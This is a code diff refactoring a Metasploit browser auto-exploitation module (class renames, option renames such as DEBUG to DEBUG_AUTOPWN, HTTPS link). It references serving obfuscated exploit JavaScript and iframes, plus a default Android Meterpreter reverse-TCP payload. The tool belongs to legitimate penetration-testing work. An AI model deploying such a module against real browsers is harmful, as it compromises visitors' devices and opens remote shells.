@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -8,12 +8,10 @@
 #   insert all of the evil js and iframes into
 # - caching is busted when different browsers come from the same IP
 
-require 'msf/core'
 require 'rex/exploitation/js/detect'
 require 'rex/exploitation/jsobfu'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer::HTML
 
   def initialize(info = {})
@@ -61,10 +59,10 @@ class Metasploit3 < Msf::Auxiliary
       'DefaultAction'  => 'WebServer'))
 
     register_options([
-      OptAddress.new('LHOST', [true,
+      OptAddressLocal.new('LHOST', [true,
         'The IP address to use for reverse-connect payloads'
       ])
-    ], self.class)
+    ])
 
     register_advanced_options([
       OptString.new('AutoRunScript', [false, "A script to automatically on session creation.", '']),
@@ -75,7 +73,7 @@ class Metasploit3 < Msf::Auxiliary
       OptRegexp.new('EXCLUDE', [false,
         'Only attempt to use exploits whose name DOES NOT match this regex'
       ]),
-      OptBool.new('DEBUG', [false,
+      OptBool.new('DEBUG_AUTOPWN', [false,
         'Do not obfuscate the javascript and print various bits of useful info to the browser',
         false
       ]),
@@ -121,7 +119,7 @@ class Metasploit3 < Msf::Auxiliary
         'The payload to use for Android reverse-connect payloads',
         'android/meterpreter/reverse_tcp'
       ])
-    ], self.class)
+    ])
 
     @exploits = Hash.new
     @payloads = Hash.new
@@ -232,8 +230,8 @@ class Metasploit3 < Msf::Auxiliary
     ENDJS
     )
 
-    if (datastore['DEBUG'])
-      print_debug("NOTE: Debug Mode; javascript will not be obfuscated")
+    if (datastore['DEBUG_AUTOPWN'])
+      print_status("NOTE: Debug Mode; javascript will not be obfuscated")
     else
       pre = Time.now
 
@@ -349,7 +347,7 @@ class Metasploit3 < Msf::Auxiliary
 
     # For testing, set the exploit uri to the name of the exploit so it's
     # easy to tell what is happening from the browser.
-    if (datastore['DEBUG'])
+    if (datastore['DEBUG_AUTOPWN'])
       @exploits[name].datastore['URIPATH'] = name
     else
       # randomize it manually since if a saved value exists in the user's
@@ -836,7 +834,7 @@ class Metasploit3 < Msf::Auxiliary
     #
 
     #js = ::Rex::Exploitation::JSObfu.new(js)
-    #js.obfuscate unless datastore["DEBUG"]
+    #js.obfuscate unless datastore["DEBUG_AUTOPWN"]
 
     response.body = "#{js}"
     print_status("Responding with #{sploit_cnt} exploits")
@@ -1056,7 +1054,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def js_debug(msg)
-    if datastore['DEBUG']
+    if datastore['DEBUG_AUTOPWN']
       return "document.body.innerHTML += #{msg};"
     end
     return ""
@@ -1074,5 +1072,4 @@ class Metasploit3 < Msf::Auxiliary
     end
     super
   end
-
 end
